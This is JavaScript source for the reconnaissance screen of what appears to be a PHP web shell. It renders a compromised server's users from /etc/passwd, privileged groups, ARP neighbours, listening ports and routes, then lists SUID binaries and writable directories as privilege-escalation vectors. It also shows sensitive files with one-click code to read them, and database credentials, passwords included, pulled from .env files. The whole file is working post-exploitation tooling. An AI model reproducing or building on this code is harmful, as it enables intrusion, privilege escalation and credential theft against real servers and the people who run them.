// ==================== DIAGNOSTICS ====================
function loadDiag() {
  const body = document.getElementById('diag-body');
  body.innerHTML = '<span class="spinner"></span>Running full recon...';

  const fd = new FormData();
  fd.append('action', 'diag');

  fetchJSON(fd)
    .then(d => {
      let html = '';

      // ---- ROW 1: System + Identity ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F4BB; System</div><div class="card-body">';
      [
        ['PHP', d.php_version],
        ['OS', d.os],
        ['Server', d.server],
        ['CWD', d.cwd],
        ['Disk Free', formatBytes(d.disk_free) + ' / ' + formatBytes(d.disk_total)],
        ['allow_url_fopen', d.allow_url_fopen ? '<span class="badge badge-ok">ON</span>' : '<span class="badge badge-no">OFF</span>'],
        ['open_basedir', d.open_basedir],
        ['sendmail_path', d.sendmail_path],
      ].forEach(([k,v]) => {
        html += '<div class="diag-item"><span class="diag-label">' + k + '</span><span class="diag-value">' + v + '</span></div>';
      });
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F464; Identity</div><div class="card-body">';
      [
        ['User', d.user_name + ' (uid=' + d.uid + ')'],
        ['Group', d.group_name + ' (gid=' + d.gid + ')'],
        ['Groups', d.groups || 'none'],
      ].forEach(([k,v]) => {
        html += '<div class="diag-item"><span class="diag-label">' + k + '</span><span class="diag-value">' + v + '</span></div>';
      });
      // Privesc-relevant group memberships
      if (d.group_memberships && Object.keys(d.group_memberships).length > 0) {
        html += '<div style="margin-top:10px;font-size:12px;color:var(--red);font-weight:600">&#x26A0; Privileged group members:</div>';
        Object.entries(d.group_memberships).forEach(([grp, members]) => {
          html += '<div class="diag-item"><span class="diag-label" style="color:var(--yellow)">' + escHtml(grp) + '</span><span class="diag-value">' + members.map(escHtml).join(', ') + '</span></div>';
        });
      }
      html += '</div></div>';
      html += '</div>';

      // ---- ROW 2: Functions + Extensions ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';
      html += '<div class="card" style="margin:0"><div class="card-header">&#x2699; Functions</div><div class="card-body">';
      Object.entries(d.functions).forEach(([fn, avail]) => {
        html += '<div class="diag-item"><span class="diag-label">' + fn + '</span>' +
          (avail ? '<span class="badge badge-ok">\u2714 available</span>' : '<span class="badge badge-no">\u2716 disabled</span>') + '</div>';
      });
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F9E9; Extensions & Tools</div><div class="card-body">';
      html += '<div style="margin-bottom:10px;display:flex;flex-wrap:wrap;gap:6px">';
      Object.entries(d.extensions).forEach(([ext, loaded]) => {
        html += '<span class="badge ' + (loaded ? 'badge-ok' : 'badge-no') + '">' + ext + '</span>';
      });
      html += '</div>';
      if (d.tools && d.tools.length > 0) {
        html += '<div style="font-size:12px;color:var(--muted);margin-bottom:4px">Interpreters / binaries:</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px">';
        d.tools.forEach(t => { html += '<span class="badge badge-ok">' + escHtml(t) + '</span>'; });
        html += '</div>';
      }
      html += '</div></div>';
      html += '</div>';

      // ---- Users with login shells ----
      if (d.passwd_users && d.passwd_users.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F465; Login Users (/etc/passwd)</div><div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>User</th><th>UID</th><th>Home</th><th>Shell</th></tr></thead><tbody>';
        d.passwd_users.forEach(u => {
          const highlight = (parseInt(u.uid) === 0 || parseInt(u.uid) >= 1000) ? 'color:var(--yellow)' : '';
          html += '<tr><td style="' + highlight + '">' + escHtml(u.user) + '</td><td>' + escHtml(u.uid) + '</td><td>' + escHtml(u.home) + '</td><td>' + escHtml(u.shell) + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // ---- Network ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F310; Network \u2014 ARP Hosts</div><div class="card-body" style="padding:0">';
      if (d.arp_hosts && d.arp_hosts.length > 0) {
        html += '<table class="file-table"><thead><tr><th>IP</th><th>MAC</th><th>Iface</th></tr></thead><tbody>';
        d.arp_hosts.forEach(h => {
          html += '<tr><td><span class="scan-host" style="cursor:pointer" onclick="document.getElementById(\'scan-cidr\').value=\'' + escHtml(h.ip) + '/32\'">' + escHtml(h.ip) + '</span></td><td style="font-size:11px;color:var(--muted)">' + escHtml(h.mac) + '</td><td>' + escHtml(h.dev) + '</td></tr>';
        });
        html += '</tbody></table>';
      } else { html += '<div style="padding:12px;color:var(--muted)">No ARP entries.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F6AA; Open Ports (listening)</div><div class="card-body">';
      if (d.open_ports && d.open_ports.length > 0) {
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px">';
        d.open_ports.forEach(p => { html += '<span class="badge badge-ok">' + p + '</span>'; });
        html += '</div>';
      } else { html += '<div style="color:var(--muted)">None detected.</div>'; }
      html += '</div></div>';
      html += '</div>';

      // Routing table
      if (d.routes && d.routes.length > 0) {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F5FA; Routes</div><div class="card-body" style="padding:0">';
        html += '<table class="file-table"><thead><tr><th>Iface</th><th>Destination</th><th>Gateway</th><th>Mask</th></tr></thead><tbody>';
        d.routes.forEach(r => {
          html += '<tr><td>' + escHtml(r.iface) + '</td><td>' + escHtml(r.dest) + '</td><td>' + escHtml(r.gw) + '</td><td>' + escHtml(r.mask) + '</td></tr>';
        });
        html += '</tbody></table></div></div>';
      }

      // ---- Privesc vectors ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F6E1; SUID Binaries</div><div class="card-body">';
      if (d.suid_bins && d.suid_bins.length > 0) {
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px">';
        d.suid_bins.forEach(b => { html += '<span class="badge badge-ok" style="background:rgba(210,153,34,.15);color:var(--yellow)">' + escHtml(b) + '</span>'; });
        html += '</div>';
      } else { html += '<div style="color:var(--muted)">None found.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x270F; Writable Dirs & Readable Sensitive Files</div><div class="card-body">';
      if (d.writable_dirs && d.writable_dirs.length > 0) {
        html += '<div style="margin-bottom:8px;font-size:12px;color:var(--muted)">Writable:</div>';
        html += '<div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px">';
        d.writable_dirs.forEach(p => { html += '<span class="badge badge-ok">' + escHtml(p) + '</span>'; });
        html += '</div>';
      }
      if (d.readable_files && d.readable_files.length > 0) {
        html += '<div style="font-size:12px;color:var(--red);margin-bottom:4px">&#x26A0; Readable sensitive files:</div>';
        d.readable_files.forEach(f => {
          html += '<div style="font-family:monospace;font-size:12px;color:var(--yellow);cursor:pointer" onclick="insertCode(\'echo file_get_contents(\\\'' + escHtml(f) + '\\\');\')">&#x1F4C4; ' + escHtml(f) + '</div>';
        });
      }
      html += '</div></div>';
      html += '</div>';

      // ---- Panels + DB creds ----
      html += '<div class="diag-grid" style="margin-bottom:16px">';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F3E0; Detected Panels</div><div class="card-body">';
      if (d.panels && d.panels.length > 0) {
        d.panels.forEach(p => { html += '<div class="diag-item"><span class="diag-value" style="color:var(--green)">&#x2713; ' + escHtml(p) + '</span></div>'; });
      } else { html += '<div style="color:var(--muted)">None detected.</div>'; }
      html += '</div></div>';

      html += '<div class="card" style="margin:0"><div class="card-header">&#x1F511; DB Credentials (.env)</div><div class="card-body">';
      if (d.db_creds && Object.keys(d.db_creds).length > 0) {
        Object.entries(d.db_creds).forEach(([file, creds]) => {
          html += '<div style="font-size:11px;color:var(--muted);margin-bottom:4px">' + escHtml(file) + '</div>';
          html += '<div class="diag-item"><span class="diag-label">Host</span><span class="diag-value">' + escHtml(creds.host) + '</span></div>';
          html += '<div class="diag-item"><span class="diag-label">User</span><span class="diag-value">' + escHtml(creds.user) + '</span></div>';
          html += '<div class="diag-item"><span class="diag-label">Pass</span><span class="diag-value" style="color:var(--red)">' + escHtml(creds.pass) + '</span></div>';
        });
      } else { html += '<div style="color:var(--muted)">None found.</div>'; }
      html += '</div></div>';
      html += '</div>';

      // ---- Build info ----
      if (typeof __BUILD !== 'undefined') {
        html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x1F3F7; Build Info</div><div class="card-body">';
        [
          ['Build ID', __BUILD.short_id],
          ['SHA256', __BUILD.hash],
          ['Built', __BUILD.timestamp],
          ['Language', __BUILD.lang],
          ['Version', __BUILD.version],
        ].forEach(([k,v]) => {
          html += '<div class="diag-item"><span class="diag-label">' + k + '</span><span class="diag-value">' + escHtml(v || 'N/A') + '</span></div>';
        });
        html += '</div></div>';
      }

      // ---- Processes ----
      html += '<div class="card" style="margin-bottom:16px"><div class="card-header">&#x25B6; Running Processes</div><div class="card-body" style="padding:0">';
      html += '<div style="max-height:300px;overflow-y:auto">';
      html += '<table class="file-table"><thead><tr><th>PID</th><th>UID</th><th>Command</th></tr></thead><tbody>';
      (d.processes || []).forEach(p => {
        const isRoot = p.uid === '0';
        html += '<tr><td style="color:var(--muted)">' + escHtml(p.pid) + '</td><td style="' + (isRoot?'color:var(--red)':'') + '">' + escHtml(p.uid) + '</td><td style="font-family:monospace;font-size:12px">' + escHtml(p.cmd) + '</td></tr>';
      });
      html += '</tbody></table></div></div></div>';

      // ---- Disabled functions ----
      html += '<div class="card"><div class="card-header">&#x1F6AB; Disabled Functions</div><div class="card-body"><div style="font-family:monospace;font-size:12px;color:var(--muted);word-break:break-all">' + escHtml(d.disable_functions) + '</div></div></div>';

      body.innerHTML = html;
    })
    .catch(err => {
      body.innerHTML = '<div style="color:var(--red)">Error: ' + escHtml(String(err)) + '</div>';
    });
}

function formatBytes(b) {
  if (b > 1e9) return (b/1e9).toFixed(1) + ' GB';
  if (b > 1e6) return (b/1e6).toFixed(1) + ' MB';
  return (b/1e3).toFixed(1) + ' KB';
}
